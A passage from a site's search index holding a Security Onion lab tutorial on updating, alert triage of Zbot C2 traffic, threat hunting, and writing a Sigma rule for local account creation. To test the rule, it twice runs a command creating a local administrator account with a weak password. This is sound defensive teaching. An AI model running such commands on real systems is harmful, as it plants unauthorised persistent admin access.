example, the current version is 2.4.141.</p> <p>To start the update process, run:</p> <pre><code>sudo soup\n</code></pre> <p>You will likely need to run <code>soup</code> twice:</p> <ul> <li>The first run updates the soup script itself.</li> <li>The second run executes the new script and downloads the updated Docker images and Salt files needed for the upgrade.</li> </ul> <p></p>"},{"location":"securityonion/securityonion.html#updating-security-onion-in-an-air-gapped-environment","title":"Updating Security Onion in an Air-Gapped Environment","text":"<p>If your Security Onion deployment is running in an air-gapped environment (i.e. no internet access), updates need to be applied using a local copy of the ISO.</p> <p>First, download the latest ISO from another internet-connected machine.</p> <p>In VMware Workstation, go to your VM\u2019s settings and navigate to Shared Folders.</p> <p>Select the folder where your new ISO is stored, tick Always enabled, and click OK to save.</p> <p></p> <p>Next, open the local console for your Standalone Security Onion VM and log in with your administrator credentials.</p> <p>To confirm that the shared folder and ISO are accessible, run:</p> <pre><code>ls /mnt/hgfs/Images\n</code></pre> <p></p> <p>As shown above, the updated ISO file <code>securityonion-2.4.150-20250512.iso</code> is available in the shared folder.</p> <p>If you cannot access the shared folder, try the following:</p> <ol> <li>Disable the shared folder in VMware settings.</li> <li>Re-enable it and try again.</li> </ol> <p>If it still does not work, temporarily connect the VM to the internet and install VMware Tools:</p> <pre><code>sudo dnf install open-vm-tools open-vm-tools-desktop -y\nsudo systemctl enable --now vmtoolsd\nsudo reboot\n</code></pre> <p>To check the system\u2019s global configuration, run the following command:</p> <pre><code>sudo salt-call pillar.get global\n</code></pre> <p></p> <p>As shown in the output, the global configuration confirms that <code>airgap: True</code>, which means the system is set up for offline updates only. To begin the update process, run <code>sudo soup</code> and this will request location for the new ISO file.</p> <pre><code>sudo soup\n</code></pre> <p>Press Enter and then enter the full path to the new Security Onion ISO.</p> <pre><code>/mnt/hgfs/Images/securityonion-2.4.150-20250512.iso\n</code></pre> <p>The first run completes the update of the soup script.</p> <p></p> <p>Now run <code>sudo soup</code> again to begin the full update process:</p> <pre><code>sudo soup\n</code></pre> <p>Since this is an air-gapped installation, the updater will also include operating system patches bundled with the ISO.</p> <p>When prompted, press <code>U</code> to confirm the OS updates. The system will now install both Oracle Linux updates and the latest Security Onion components. Note that this process can take a while. </p> <p></p> <p>When the update is complete, we will see the message soup has been served.</p> <p></p> <p>Verify the version by running:</p> <pre><code>cat /etc/soversion\n</code></pre> <p></p> <p>We can now see that the version is 2.4.150.</p> <p>Verify the node and container status by running:</p> <pre><code>sudo so-status\n</code></pre> <p></p> <p>Typically after kernel update, the Security Onion VM needs to be rebooted. </p>"},{"location":"securityonion/securityonion.html#alert-triage-and-case-creation","title":"Alert Triage and Case Creation","text":"<p>To begin reviewing security alerts, go to the Alerts tab in the SOC web interface. This is where all triggered alerts are displayed, helping you identify suspicious or potentially malicious activity in your environment.</p> <p></p> <p>At the top of the Alerts page, there is an Options drop-down menu that lets you customise how alerts are displayed:</p> <ul> <li>Enable advanced interface features makes the alert view work more like the Hunt interface.</li> <li>Acknowledged shows alerts you have marked as false positives.</li> <li>Escalated shows alerts that have been turned into cases for further investigation.</li> <li>You can also set an auto-refresh interval to check for new alerts regularly.</li> <li>The time zone setting adjusts how timestamps appear. Logs are stored in UTC, but the web console converts them to your local time zone for easier viewing.</li> </ul> <p></p> <p>Total Found shows the number of alerts triggered during the selected time period. It counts every alert, not just the number of different rules that were matched.</p> <p>By default, the Time Selector is set to relative time, so we are looking at alerts from the past 24 hours. If needed, you can switch to a specific date and time by clicking the clock icon, but for now we will stick with the relative view.</p> <p></p> <p>In the upper left corner, there is a query drop-down menu. By default, alerts are grouped by the rule name and the module that generated them typically from tools like Suricata, Strelka, or Sigma-based detections.</p> <p>Each rule also has a severity level, which is defined in the rule itself. You can adjust this if it does not suit your environment.</p> <p>To focus on high severity alerts, simply click on high, then choose Include to filter your results.</p> <p></p> <p>This adds the severity filter to your search query, shown as a blue tag labelled <code>event.severity_label:\"high\"</code>.</p> <p></p> <p>You can also sort the alerts by severity level by clicking on the <code>event.severity_level</code> column heading.</p> <p></p> <p>The Count column shows how many times a particular alert has been triggered.</p> <p>By default, alerts are grouped by rule name. If you want to see the individual alert events, click on the Count number or the rule name, then choose Drilldown.</p> <p>For example, click on GPL NETBIOS SMB IPC$ unicode share access and select Drilldown.</p> <p>Note: Clicking the info icon next to the rule will turn it into a green pin and display a summary of what the rule is designed to detect in the side panel.</p> <p></p> <p>This reveals 10 individual alerts triggered by three different source IPs connecting over SMB to two different destination IPs.</p> <p>When you see activity like this, it\u2019s worth investigating further to determine whether the traffic is legitimate or potentially malicious.</p> <p></p> <p></p> <p>If the traffic is known to be safe (i.e. a false positive), you can make a note of it for future alert tuning, and then acknowledge the alerts by clicking the bell icon.</p> <p>This will remove the alerts from the main queue but they are not deleted, just marked as reviewed.</p> <p></p> <p></p> <p>You can also fine-tune how the rule behaves by clicking on the rule name and selecting Tune Detection from the menu.</p> <p></p> <p>This opens the Tune Detection page, where you can either enable or disable the rule, or adjust it to better fit your environment.</p> <p>For example, to suppress alerts from a trusted source:</p> <ul> <li>Click the + icon</li> <li>Set Type to Suppress</li> <li>Set Track to by_src</li> <li>Enter the IP in CIDR format: <code>192.168.10.124/24</code></li> <li>Add a note like known good traffic</li> </ul> <p>This helps reduce noise from alerts you\u2019ve already verified as safe.</p> <p></p> <p>You can also edit the rule directly by going to the Detection Source section. This gives you access to the full rule definition, allowing for more advanced customisation if needed.</p> <p></p> <p>To view alerts you\u2019ve previously acknowledged, return to the Alerts tab, click on Options, then select Acknowledged. This will display alerts you have marked as reviewed or false positives.</p> <p></p> <p>Now let\u2019s focus on alerts that are more likely to indicate real threats. For example, drill down into the rule ET MALWARE Zbot POST Request to C2 to investigate activity that may involve communication with a command-and-control server.</p> <p></p> <p>This reveals nine alerts involving three separate source IPs making connections to three different destination IPs over port 80 which is a common port for HTTP traffic. This pattern could suggest coordinated or suspicious activity worth further investigation.</p> <p></p> <p></p> <p>You can click to expand an individual alert for a closer look.</p> <p>If you scroll down to the Suricata rule section (<code>rule.rule</code>), you will see that this alert is triggered by HTTP traffic flowing from your internal network to an external server. The rule is checking for specific HTTP headers within an established connection which is a common indicator of command-and-control activity or data exfiltration.</p> <p></p> <p></p> <p>If you scroll up to the <code>network.data.decoded</code> section, you will see the client is making a POST request to a PHP page, using MSIE 6.0 as the User-Agent which is an outdated browser version often associated with malicious traffic.</p> <p>The destination host is <code>ishi-bati.com</code>, which appears suspicious and may warrant further investigation.</p> <p></p> <p>To get more context on the alert, you can pivot into a packet capture (PCAP) from any relevant field.</p> <p>For example, click on <code>network.data.decoded</code>, then go to Actions \u2192 PCAP. This will open the full packet capture related to the alert, letting you analyse the actual network traffic involved.</p> <p></p> <p>Reviewing the PCAP, we can see a clear connection between the internal host and an external web server, with what appears to be encoded data being exchanged.</p> <p>This kind of traffic is unusual and could indicate command-and-control (C2) communication. This definitely looks like something that needs more investigation. </p> <p></p> <p>Head back to the Alerts tab, locate the alert, select it, and then click the triangle icon to escalate it to a new case. This begins formal tracking of your investigation within the SOC\u2019s case management system.</p> <p></p> <p>Go to the Cases tab in the SOC web interface. You will see a new case has been created, named after the alert you escalated.</p> <p>This case acts as a central place to track your investigation, record notes, and link to other evidence found during your threat hunting.</p> <p>Click the binoculars icon to open the case and view its details.</p> <p></p> <p>On the right-hand side of the case view, you will find metadata fields to help manage the investigation.</p> <p>If you are working in a team, use the Assignee drop-down to allocate the case to a specific analyst. Change the Status from New to In Progress to reflect that the investigation has started.</p> <p>You can also set the case\u2019s Severity and Priority, apply a TLP (Traffic Light Protocol) or PAP (Permissible Action Protocol) level for information sharing, and use Category and Tags to group related cases or highlight key findings.</p> <p></p> <p>At the top of the case window, you will see several tabs. The Comments tab lets you add notes using Markdown formatting. Each comment is automatically tagged with the author\u2019s username and a timestamp.</p> <p>For example, you might add the following note:</p> <pre><code># Findings\n## Host\n**ishi-bati.com** is not flagged as malicious in VirusTotal.\n</code></pre> <p></p> <p>The Attachments tab lets you upload files or artefacts related to the investigation. For instance, you can attach relevant Sysmon logs, Windows Event Logs (EVTX files), or any other evidence that supports your analysis of the alert.</p> <p></p> <p></p> <p>Observables are specific indicators such as IP addresses, hashes, or domains that you identify during an investigation.</p> <p>In Security Onion, some observables like source and destination IPs are automatically extracted from alerts and added to the case for easier tracking and correlation.</p> <p></p> <p>Under the Actions column for each observable, you will find a few icons.</p> <p>Clicking the crosshair icon will launch a new Hunt session focused on that specific observable. For example, selecting the crosshair next to the first entry will open a hunt centred around the IP address 192.168.3.65, allowing you to dig deeper into related activity.</p> <p></p> <p></p> <p>The lightning bolt icon runs any analysers you have set up for that type of data.</p> <p>For example, clicking the lightning bolt next to the first observable will trigger analysis on that item. You can then expand the observable to view the results.</p> <p>Note: This feature requires internal analysers to be properly configured in your Security Onion setup.</p> <p></p> <p></p> <p>The Events tab displays all events that have been escalated and formally linked to the case. This helps you keep track of the specific alerts and logs you are investigating as part of that case.</p> <p></p> <p>The History tab acts as an audit log for the case. It records every action taken such as items being added, changed, or deleted along with the username of the person who made the change and a timestamp for accountability.</p> <p></p> <p>Let\u2019s revisit the ET MALWARE Zbot POST Request to C2 alerts and narrow our focus to a specific host.</p> <p>Click on the source IP <code>192.168.3.65</code> and select Only. This will filter the alerts to show only those involving that IP address, helping us investigate its activity in more detail.</p> <p></p> <p>Click on the Timestamp column to sort the alerts chronologically.</p> <p>From the timeline, it appears there was Zbot download activity, followed by a C2 POST request, and then an EXE file download over HTTP. This ****sequence strongly suggests malware infection and command-and-control behaviour.</p> <p></p> <p>Expand the alert titled ET INFO PE EXE or DLL Windows file download HTTP to view the full details.</p> <p>This rule is triggered when a Windows executable (.exe) or DLL file is downloaded over HTTP, which is often a red flag especially when it happens outside normal software update mechanisms.</p> <p></p> <p>Scrolling down to the <code>network.data.decoded</code> field, we can see clear signs that a Windows executable is being downloaded. The presence of the <code>MZ</code> header and the string \u201cThis program cannot be run in DOS mode\u201d are strong indicators of a PE (Portable Executable) file.</p> <p>This confirms that a <code>.exe</code> file was likely transferred over HTTP.</p> <p></p> <p>To view all logs associated with this specific network flow, you can pivot using the <code>community_id</code> which is a unique hash that Security Onion assigns to each flow, based on the source/destination IPs, ports, and protocol (e.g. TCP or UDP). This makes it easy to group and investigate related activity across different log types.</p> <p>Click on <code>network.data.decoded</code>, then choose Correlate. This will open a Hunt view showing all logs linked to that same network flow.</p> <p></p> <p>This opens a dashboard view containing all available information about the network flow.</p> <p>You will see network metadata from Zeek, along with any Suricata alerts, displayed in the Group Metrics pane. This consolidated view helps you quickly understand what occurred during the flow and which detection tools flagged it.</p> <p></p> <p></p> <p>As you scroll down, you will see a list of alerts alongside the HTTP requests sent by the client to the external server.</p> <p>This provides a clear view of the interaction including what was requested, when it happened, and which alerts were triggered as a result, making it easier to piece together the sequence of events.</p> <p></p> <p>Since <code>zeek.file</code> records do not include network connection details, you will need to correlate them with the <code>zeek.conn</code> records to link the file activity to its corresponding network flow.</p> <p>Scroll down to the <code>zeek.conn</code> dataset, click Actions, then select Correlate. This will tie the file metadata to the relevant connection log, giving you the full context of how the file was transferred.</p> <p></p> <p>After correlating with the connection log, you should now see <code>zeek.file</code> records appear.</p> <p></p> <p>If you scroll down and expand the <code>zeek.file</code> entry, you will find detailed information about the transferred executable file including file size, MIME type, and most importantly, hash values like MD5, SHA1, and SHA256.</p> <p></p> <p></p> <p>You can check if the file is known to be malicious by clicking on any of the hash values (MD5, SHA1, or SHA256) and selecting VirusTotal.</p> <p>This will open a link to VirusTotal with a lookup of the hash, showing if the file has been flagged by any antivirus engines or threat intelligence sources.</p> <p></p> <p>As expected, the VirusTotal results confirm that this is indeed a malicious file.</p> <p></p> <p>To link this file to your investigation, click the triangle icon on the relevant <code>zeek.file</code> record. Then choose the name of your case under \"Attach event to a recently viewed case\".</p> <p>This ensures the event is documented as part of your case evidence.</p> <p></p> <p>If you return to the Cases tab and open the Events section for your case, you will see that the <code>zeek.file</code> record has been successfully added confirming it is now part of your investigation\u2019s evidence trail.</p> <p></p> <p>To add the file hash as an Observable, open the event, scroll down to the hash section, and click on the eye icon next to the hash value.</p> <p>This will extract the hash and add it to the case as an observable, making it easier to track and hunt for across your environment.</p> <p></p> <p></p> <p>This action will automatically open the Add Observable pane with the hash values pre-filled. Simply click ADD to save the observable to your case.</p> <p></p> <p>You can now click the crosshair icon next to the observable to launch a new hunt focused on that hash. This helps you check whether the same file appears anywhere else in your environment, which could indicate further compromise.</p> <p></p> <p>You can keep building on the investigation by returning to the original Zbot C2 alerts, reviewing activity from other source IPs, and identifying any further signs of infection. Use the PCAPs and network metadata to extract additional Indicators of Compromise (IOCs) and document your findings clearly within the case.</p> <p>Summary of Alert Triage and Case Creation:</p> <ul> <li>The Alerts tab shows potential threats detected in your network.</li> <li>Analysts can review, acknowledge, dismiss, or escalate alerts to cases for further analysis.</li> <li>Once escalated, cases serve as a central record for investigations \u2014 storing related events, observables, and attachments.</li> </ul>"},{"location":"securityonion/securityonion.html#threat-hunting","title":"Threat Hunting","text":"<p>Go to the Hunt page in the SOC web interface.</p> <p>In the Options drop-down:</p> <ul> <li>Automatically apply filters, groupings and date ranges controls whether queries update automatically when you adjust search settings. If disabled, you will need to click the Hunt button manually to refresh results.</li> <li>The next three toggles let you exclude case data, detection rules, and SOC logs from your search. These are enabled by default to avoid clutter.</li> <li>You can also set an auto-refresh interval and choose a local time zone for viewing results.</li> </ul> <p>In the top-right corner, you will see a Total Found count showing how many records were returned by the current query.</p> <p></p> <p>In the top-left corner of the Hunt page, you will find the query drop-down. Clicking the down arrow reveals a list of prebuilt queries.</p> <p>Next to it is a free-text query box, where you can enter custom searches using Onion Query Language (OQL) which is ****a simple, powerful syntax tailored for Security Onion.</p> <p>By default, the query is <code>*</code>, which means:</p> <ul> <li>Show all records from the last 24 hours.</li> <li>Group them by observer.name which, in a Standalone setup, is just your Security Onion VM.</li> </ul> <p></p> <p>From the query drop-down, select Log Type.</p> <p></p> <p>We are now viewing all records, grouped by their event modules and datasets.</p> <ul> <li>Base Metrics have been refreshed to reflect the current query.</li> <li>The bar graphs display the most common event modules, ranked from highest to lowest.</li> <li>Group Metrics show how many records exist for each combination of event module and dataset, giving a clearer picture of log volume and distribution.</li> </ul> <p></p> <p></p> <p>Scrolling down, you will see Suricata alerts, which are generated by the Network Intrusion Detection System (NIDS) built into Security Onion.</p> <p>You will also notice a variety of metadata produced by Zeek. For every network flow observed, Zeek logs:</p> <ul> <li>A connection record (basic flow info), and</li> <li>A protocol-specific record (e.g. HTTP, DNS) if the traffic matches known protocol patterns.</li> </ul> <p>This layered logging helps analysts get both high-level context and detailed protocol insights during threat hunts.</p> <p></p> <p>To look at zeek logs, click on zeek and select Include. </p> <p></p> <p>The query now reads <code>AND event.module:\"zeek\"</code>. This tells Security Onion to show only Zeek events, grouped by both event.module and event.dataset.</p> <p>But since we are already filtering for just Zeek, grouping by <code>event.module</code> is redundant. You can tidy up the view by:</p> <ul> <li>Removing <code>groupby event.module</code> from the query box, or</li> <li>Clicking the close icon above the group column to remove it.</li> </ul> <p>This will simplify the results, grouping only by event.dataset, which is more useful in this context.</p> <p></p> <p>With the query now refined to only show Zeek logs grouped by dataset, we are ready to begin our threat hunt. </p> <p>Our objective is to hunt for a suspicious or malicious HTTP traffic.</p> <p>To begin:</p> <ul> <li>Locate the <code>zeek.http</code> dataset in the Group Metrics pane.</li> <li>Click on it and choose Only.</li> </ul> <p>This filters the view to show just HTTP traffic parsed by Zeek, which includes helpful metadata like destination port, host, URI, and user-agent which is perfect for spotting suspicious patterns.</p> <p></p> <p>As shown by the Group Metrics, we are now looking at 885 zeek.http records. </p> <p></p> <p>Scrolling down, we can see the list of individual events. </p> <p></p> <p>To dig deeper into the events, you can expand any individual log entry for more detail.</p> <p>Every field in the event can be used as a pivot point or to refine your view. For example:</p> <ul> <li>To group HTTP logs by destination port, click on the <code>destination.port</code> field and select Group By.</li> <li>Alternatively, click the stacked paper icon next to the field.</li> </ul> <p>Here is the difference:</p> <ul> <li>Group By: Adds the field to your current table, refining the existing groupings.</li> <li>New Group By: Creates a separate table with the new grouping applied, keeping the original intact.</li> </ul> <p></p> <p>Now that we have grouped the HTTP logs by destination port, we can see they fall into four distinct buckets. While some use the standard port 80, others are going to non-standard ports like 2869.</p> <p>To cross-reference this with known alerts:</p> <ul> <li>Open the Alerts tab in a new browser tab.</li> <li>Drill down into the alert titled ET MALWARE Zbot POST Request to C2.</li> </ul> <p>From there, you will see that port 80 is indeed linked to command-and-control (C2) HTTP traffic, confirming its relevance to our investigation.</p> <p></p> <p></p> <p>Back on the Hunt page, to focus specifically on HTTP traffic using port 80 (which we now know is linked to malicious activity):</p> <ul> <li>Click on the <code>destination.port</code> value 80 in the table.</li> <li>Select Include.</li> </ul> <p>This filters your results to show only HTTP traffic on port 80 helping narrow your investigation to flows potentially related to Zbot C2 or similar threats.</p> <p></p> <p>Your query now reads <code>zeek.http AND destination.port: 80</code>. </p> <p>This means you are filtering for only Zeek HTTP logs where the destination port is 80 so your results should now be limited to standard HTTP traffic, including any potentially malicious connections using that port (like the Zbot C2 we saw earlier).</p> <p></p> <p>As you scroll through the filtered results, you will notice plenty of GET requests and a few POST requests.</p> <p>Since the Zbot C2 alert flagged POST requests as suspicious, let\u2019s focus on those:</p> <ul> <li>Click on the <code>http.method</code> field where it shows POST.</li> <li>Select Group By.</li> </ul> <p>This will group your data by HTTP method, allowing you to isolate and analyse the POST requests more easily which are often associated with data exfiltration or C2 communication.</p> <p></p> <p>To focus on the POST requests, click on POST and select Include.  </p> <p></p> <p>We can now see zeek.http requests using POST http method. </p> <p></p> <p>As you scroll down, you will now spot the same source IPs that were identified in the alert:</p> <p>192.168.3.25, 192.168.3.35, and 192.168.3.65 which is a strong indication of a match.</p> <p>To investigate further:</p> <ol> <li>Click on the <code>http.request.body.length</code> column header to sort the events by payload size. This helps surface larger POST requests which may contain encoded or exfiltrated data.</li> <li>Find the first event from 192.168.3.65.</li> <li>Click Actions, then PCAP to open a packet capture view of that session.</li> </ol> <p>This gives you a direct look at the traffic, making it easier to identify signs of malware communications like beaconing or data uploads.</p> <p></p> <p></p> <p></p> <p>This is a typical example of beaconing behaviour, where an infected system is quietly reaching out to a remote server to check for instructions. We can tell because we are seeing repeated, identical HTTP POST requests being sent to the same URL (<code>youyou.php</code>).</p> <p>Each of these requests contains encoded binary data, likely being sent to a command-and-control (C2) server. The fact that the requests are structured the same way and sent at regular intervals strongly suggests they are automated, not made by a person using a web browser, but by malware or a background script.</p> <p>If we go back to the Hunt page and expand one of the logs, we will see a field called <code>log.id.uid</code>. This is an internal ID used by Zeek to link together multiple logs from the same network flow like connection records, HTTP logs, and file transfers, making it easier to follow the full picture of what happened.</p> <p>There is also a field called <code>network.community_id</code>. This is a unique hash made up of the source and destination IP addresses, ports, and protocol. It helps analysts correlate related events across tools like Zeek, Sysmon, firewall logs, or Elastic Agent data.</p> <p>To see all related logs for this HTTP event, just click the <code>network.community_id</code> field and choose Actions \u2192 Correlate. This will bring up all events tied to that same flow for deeper investigation.</p> <p></p> <p></p> <p>This opens a new Hunt window with an OR query that includes both the log ID and the community ID from the selected HTTP event.</p> <p>This query pulls in all related data so you can now view everything Security Onion has recorded about that flow, across different sources, all within the tables and visualisations on this page.</p> <p></p> <p></p> <p>We can focus on the zeek file records by clicking on zeek.file and selecting Include.</p> <p></p> <p>As you scroll down, you will see the individual events tied to that network flow.</p> <p>If these events occurred further along the attack chain, they may reveal what the attacker exfiltrated or accessed from your environment giving you insight into what data may have been compromised.</p> <p></p> <p></p> <p></p> <p>To work out where the initial infection came from, we will need to examine other Zeek file logs linked to the same system.</p> <p>Click on the source IP address and choose Include. This filters the Hunt results to show only activity involving that particular host, helping you trace the infection\u2019s origin.</p> <p></p> <p>Remove the community ID filters from your query. This allows you to see all network flows related to the selected source IP, not just the ones tied to a single session. </p> <p></p> <p>There are 22 different file records linked to the source IP 192.168.3.65, suggesting this host has been involved in multiple file transfers, which may include the original point of infection.</p> <p></p> <p>As we scroll down, we notice one file is a Windows DOS executable which is a potential indicator of a malicious payload or the initial infection file. This needs a closer inspection.</p> <p></p> <p>The next step is to extract the executable from the PCAP file to confirm whether it was the initial point of compromise. After that, you can hunt across your network to check if any other systems have downloaded or executed the same file.</p> <p>The Hunt interface is designed for analysts to quickly explore and interpret collected data, allowing you to summarise patterns, compare records, and pivot between different log sources during an investigation.</p> <p>The Dashboards feature offers similar functionality but with a wide range of prebuilt visualisations for specific use cases.</p> <p>To get started, go to the Dashboards tab in the SOC web interface.</p> <p>The default view gives a high-level summary of all data within Security Onion, presented through SANCII diagrams, bar charts, pie graphs, and tables that break down each dataset.</p> <p></p> <p>Besides the default overview, there are several prebuilt dashboards tailored to specific protocols and data sources.</p> <p>If you would like to carry out a similar threat hunt via Dashboards, a good place to begin is the HTTP dashboard, which focuses specifically on HTTP traffic patterns and related events.</p> <p></p> <p>You will see a variety of tables and visualisations that summarise all HTTP connection data.</p> <p>To filter for port 80 traffic, you can do it just like in the Hunt interface, by selecting destination.port 80 and choosing Include to narrow the results.</p> <p></p> <p>Scroll down the dashboard, find <code>destination.port 80</code>, and click Include to filter the results to show only HTTP traffic using port 80.</p> <p></p> <p>To focus on POST requests, scroll to <code>http.method</code>, click on POST, and choose Include. This will filter the dashboard to show only HTTP POST traffic.</p> <p></p> <p>The dashboard now displays only HTTP POST requests, allowing you to focus your analysis on traffic that may indicate data uploads or command-and-control activity.</p> <p></p> <p>Scroll down and sort the tables by <code>http.request.body.length</code> to prioritise entries with larger POST payloads. You should now see the same suspicious activity identified earlier in the Hunt interface, confirming consistency across both views.</p> <p></p> <p>Both Dashboards and Hunt pull from the same underlying data. They just offer different ways of interacting with it. </p> <p>You can use either interface for threat hunting and investigations, depending on whether you prefer visual summaries or a more flexible, query-driven approach.</p>"},{"location":"securityonion/securityonion.html#detection-engineering","title":"Detection Engineering","text":"<p>Go to the Detections section in the SOC web interface. By default, it displays all available rules, grouped by detection language.</p> <p>Security Onion supports three types of detection rules, each tailored for a specific purpose:</p> <ul> <li>Suricata rules are used for network-based detection. These rules scan live network traffic captured on the monitoring interface, looking for patterns such as specific IPs, ports, or keywords. For example, if you wanted to be alerted whenever \u201cPHP\u201d appeared in traffic on port 80, a Suricata rule would suit that need.</li> <li>Yara rules are for file-based detection. Security Onion automatically extracts files from unencrypted network traffic such as <code>.exe</code>, <code>.docx</code>, or <code>.pdf</code> and checks them using Yara rules via the strelka module. These rules are useful for spotting files with suspicious patterns, like those containing malware-related strings or known risky behaviours (e.g. Office macros). If you need to detect an executable signed with a specific certificate, Yara is the way to go.</li> <li>Sigma rules are used for log-based detection. They work by creating Elastic Query Language (EQL) queries that regularly scan collected logs (like Windows event logs or Sysmon) for known Indicators of Compromise (IOCs). When a match is found, an alert is generated.</li> </ul> <p>Each detection language targets a different layer: network traffic, file analysis, or system logs giving you a wide coverage across the attack surface.</p> <p></p> <p></p> <p>If you scroll down, you will see that the tables are fully interactive and can be used to adjust the query in the search bar.</p> <p>For instance, if you only want to view Sigma rules, simply click on sigma and choose Include. You will notice that the detection results and the list of enabled rules update to reflect that filter.</p> <p></p> <p></p> <p></p> <p>Most of the Sigma rules included with Security Onion are turned off by default. Each enabled rule runs an Elasticsearch query every few minutes, so enabling all of them could put heavy strain on the Grid and affect performance.</p> <p>To inspect a rule more closely, click the binoculars icon next to its name.</p> <p></p> <p>This opens the tuning interface for that specific rule. The Overview tab shows a summary of the rule, any related references, and the detection logic. In this example, the rule is set to trigger on POST requests to a web server that contain certain attributes. If those are detected, it may indicate an attempt to exploit an unauthenticated Remote Code Execution (RCE) vulnerability in the Zimbra Collaboration Suite and an alert will be generated.</p> <p></p> <p>On the right-hand side of the window, you will find additional details about the rule. This includes its Public ID (a unique identifier used internally), the rule type, the ruleset it belongs to, its severity, the author, the license, and the dates it was created and last updated. At the top, there is a slider, which is currently set to Disabled. You can click the slider to enable the rule.</p> <p></p> <p>The Operational Notes tab gives analysts a place to record notes about the rule, including any tuning they have applied and how effective the rule has been in their environment.</p> <p></p> <p>The Detection Source tab displays the complete Sigma rule text, including details not shown on the Overview page, such as possible false positives and the MITRE ATT&amp;CK technique IDs that the rule maps to.</p> <p></p> <p></p> <p>The Tuning tab gives you a tailored interface for adjusting each rule type to better suit your environment. For instance, Suricata rules can be suppressed or have thresholds set, while Sigma rules can be fine-tuned using Sigma filters.</p> <p></p> <p>The History tab gives you a full audit trail of any changes made to the rule since it was first brought into your Security Onion setup.</p> <p></p> <p>Let\u2019s walk through a Detection Engineering scenario. You have found a gap in your current detections and you want to be alerted whenever a local user account is created on a Windows machine.</p> <p>Since your organisation uses Active Directory, the policy is that all accounts should be created through AD. So if a local account appears, it could mean:</p> <ul> <li>Someone is not following the policy,</li> <li>A misconfigured app has created it, or</li> <li>An attacker is trying to set up persistence.</li> </ul> <p>Whatever the cause, you want to know about it.</p> <p>The Windows Event ID 4720 is triggered when a new local account is created. That is the event you will use to detect this behaviour.</p> <p>To simulate this, we will create a local administrator account on the Windows Server VM using the following command:</p> <pre><code>net user bob Passw0rd /add; net localgroup administrators bob /add\n</code></pre> <p></p> <p>Go to the Detections page in the SOC web interface.</p> <p>Click on the plus icon to create a new rule and add it to your detection setup.</p> <p>This is where you will define the rule that alerts on the creation of local user accounts.</p> <p></p> <p>In the Add Detection window, choose Sigma from the drop-down menu. This is the best option since we\u2019re creating a rule based on a log entry (Event ID 4720).</p> <p>Set the License field to None.</p> <p>You will see a pre-filled Sigma template which outlines all the key fields like title, ID, log source, detection condition, etc. The URLs at the top link to guides that help you write proper Sigma rules: Sigma Rule Creation Guide and Logsources Reference. </p> <p>Replace the template with the following custom rule:</p> <pre><code># This is a Sigma rule template, which uses YAML. Replace all template values with your own values.\n# The id (UUIDv4) is pregenerated and can safely be used.\n# Click \"Convert\" to convert the Sigma rule to use Security Onion field mappings within an EQL query\n#\n# Rule Creation Guide: https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide\n# Logsources: https://sigmahq.io/docs/basics/log-sources.html\n\ntitle: \"Detecting a Local Account Creation Event\"\nid: 637b33d2-4125-48c5-982e-3f3a9df09fbe  # You can generate a new UUID if needed\nstatus: experimental\ndescription: |\n  This rule generates an alert when a local user account is created on a Windows endpoint. It matches Event ID 4720, which indicates a user account was successfully created.\nreferences:\n  - 'https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720'\nauthor: 'put your name here'\ndate: 2025/05/17\ntags:\n  - attack.persistence\n  - attack.t1136.001  # Create Account: Local Account\nlogsource:\n  service: security\n  product: windows\ndetection:\n  selection:\n    EventID: 4720\n  condition: selection\nlevel: 'high' # info | low | medium | high | critical\n</code></pre> <p></p> <p>In a Sigma rule, the first section contains metadata such as the title, description, references, and tags. It is best to fill these out properly to help both yourself and other analysts who might investigate this alert later.</p> <p>In this example:</p> <ul> <li>The reference is a link to the official Microsoft documentation about Event ID 4720.</li> <li>If you have an internal SOP or playbook related to handling this alert, you can include that too.</li> <li>The tags align with the MITRE ATT&amp;CK framework. Creating a local account is a persistence tactic, and is listed under T1136.001.</li> </ul> <p>The logsource tells Security Onion where to look. In this case, the Windows Security Event log. It\u2019s important to get this right so the rule runs against the right type of log data.</p> <p>The detection section says: if there is an event with Event ID 4720, trigger an alert.</p> <p>The level defines how serious the alert is. It is set to high by default but you can adjust it to match your environment.</p> <p>Note: the Sigma rule itself does not run directly. It gets converted into an EQL (Elasticsearch Query Language) query and that is what actually runs in the backend.</p> <p>To see this:</p> <ul> <li>Click Convert to preview the EQL version.</li> <li>To test it live, click Test in Kibana. This will open the query in Kibana Dev Tools and return any matching results.</li> </ul> <p></p> <p>The query appears on the left-hand side, and when you click the play button, any matching events will be displayed on the right.</p> <p></p> <p>Even if you are not planning to test the query straight away, it is still a good idea to do the conversion step to make sure everything looks correct, especially for more complex detection rules.</p> <p>Everything looks fine here, so go ahead and click Create to add the Sigma rule to our list of detections.</p> <p></p> <p></p> <p>The rule is not enabled by default, but if you want to activate it, just click the slider to turn it on.</p> <p></p> <p>Now that the rule is active, any time a Windows Event ID 4720 is logged, which indicates a new local user account was created, we will receive an alert.</p> <p>To test this, a local admin account named joe was created on the Windows Server VM using:</p> <pre><code>net user joe Passw0rd /add; net localgroup administrators joe /add\n</code></pre> <p>Head to the Alerts page in the SOC web interface. You should see an alert confirming that the rule successfully triggered based on this activity.</p> <p></p> <p>Start by identifying a detection gap (something your current setup is not alerting on but should be). Next, determine what logs or events you will need to collect to detect that activity. Once the necessary data is being ingested, write a detection rule using one of the supported rule languages (Suricata, YARA, or Sigma) in the Detections section of Security Onion. Finally, deploy the rule, test it to make sure it works as expected, and tune it to reduce false positives and ensure it fits your environment.</p>"},{"location":"securityonion/securityonion.html#references","title":"References","text":"<ul> <li>https://docs.securityonion.net/en/2.4/</li> <li>https://youtu.be/Jb_sb_vLrB0?si=yTvJcF0TiHFUYfZt</li> <li>https://youtu.be/-6B04sZPdz4?si=MsMTW89rSw5Xfl39</li> <li>https://youtu.be/i9hxtIHwlQI?si=HMuiwdQlZgnDbHVu</li> <li>https://youtu.be/j0uWmqvYSrI?si=gnurOgxNyI-YsmxJ</li> <li>https://youtu.be/L1H7UoDoUY8?si=HSNe6HhhHX3ikjAc</li> <li>https://youtu.be/Tv8uis-ocjQ?si=OVLGlLLuX_Kb8EUM</li> <li>https://youtu.be/OQt0lvpvkr8?si=6-swKUUfLhEzOwSx</li> </ul>"},{"location":"shuffle/shuffle.html","title":"Shuffle","text":""},{"location":"shuffle/shuffle.html#shuffle","title":"Shuffle","text":""},{"location":"shuffle/shuffle.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, Shuffle is installed on an Ubuntu VM. Automated workflows were created using 